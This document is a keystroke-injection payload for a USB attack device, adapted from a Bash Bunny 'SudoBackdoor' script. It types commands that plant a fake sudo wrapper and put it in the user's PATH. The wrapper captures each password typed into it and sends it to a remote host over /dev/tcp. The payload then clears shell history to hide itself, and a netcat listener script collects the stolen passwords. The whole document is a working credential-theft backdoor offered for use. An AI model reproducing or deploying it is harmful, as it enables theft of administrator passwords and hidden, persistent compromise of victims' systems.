Payload originally designed by oXis for Bash Bunny.

Bash Bunny Payload page: https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/SudoBackdoor

Change example.com to your own domain or listening IP address and 1337 to your own port of choice.

```
REM Modified by 5h@d0w
DELAY 2000
GUI space
DELAY 500
ALT F2
DELAY 500
BACKSPACE
DELAY 100
STRING terminal
ENTER
DELAY 3000
STRING rm -rf ~/.config/sudo
ENTER
DELAY 100
STRING mkdir -p ~/.config/sudo
ENTER
DELAY 100
STRING echo '#!'$SHELL > ~/.config/sudo/sudo
ENTER
STRING /usr/bin/sudo -n true 2>/dev/null
ENTER
STRING if [ $? -eq 0 ]
ENTER
STRING then
ENTER
STRING /usr/bin/sudo $@
ENTER
STRING else
ENTER
STRING echo -n "[sudo] password for $USER: "
ENTER
STRING read -s pwd
ENTER
STRING echo
ENTER
STRING echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
ENTER
STRING if [ $? -eq 1 ]
ENTER
STRING then
ENTER
STRING echo "$USER:$pwd:invalid" > /dev/tcp/example.com/1337
ENTER
STRING echo "Sorry, try again."
ENTER
STRING sudo $@
ENTER
STRING else
ENTER
STRING echo "$USER:$pwd:valid" > /dev/tcp/example.com/1337
ENTER
STRING echo "$pwd" | /usr/bin/sudo -S $@
ENTER
STRING fi
ENTER
STRING fi' > ~/.config/sudo/sudo
ENTER
DELAY 100
STRING chmod u+x ~/.config/sudo/sudo
ENTER
DELAY 100
STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile
ENTER
DELAY 100
STRING echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc
ENTER
DELAY 100
STRING history -c && rm .bash_history && exit
ENTER
DELAY 400
GUI q
```

Use this bash script to listen on your server:

```
#!/bin/bash
while [ true ]
do
netcat -vv -lp 1337 >> passwd.txt
done
```